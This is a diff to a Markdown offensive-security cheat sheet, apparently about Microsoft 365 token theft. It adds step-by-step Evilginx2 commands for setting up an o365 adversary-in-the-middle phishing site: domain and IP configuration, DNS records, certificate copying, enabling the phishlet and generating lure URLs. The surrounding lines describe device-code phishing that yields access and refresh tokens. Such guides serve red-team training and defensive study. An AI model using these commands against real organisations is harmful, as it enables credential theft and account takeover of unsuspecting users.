@@ -98,3 +98,26 @@ roadtx codeauth -c <app-id> -r msgraph -t <tenant-id> <0.A....> -ru 'https://<ph
 * Leave TokenTactics running in the PowerShell window and send the phishing email
 * Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form
 * Enjoy your **access token** and **refresh token**
+
+
+## Phishing with Evilginx2
+
+* Run `evilginx2` with o365 phishlet
+    ```powershell
+    PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
+    : config domain username.corp
+    : config ip 10.10.10.10
+    : phishlets hostname o365 login.username.corp
+    : phishlets get-hosts o365
+    ```
+* Create a DNS entry type A for `login.login.username.corp` and `www.login.username.corp`, pointing to your machine
+* Copy certificate and enable the phishing
+    ```ps1
+    PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
+    PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
+    : phishlets enable o365
+
+    # get the phishing URL
+    : lures create o365
+    : lures get-url 0
+    ```
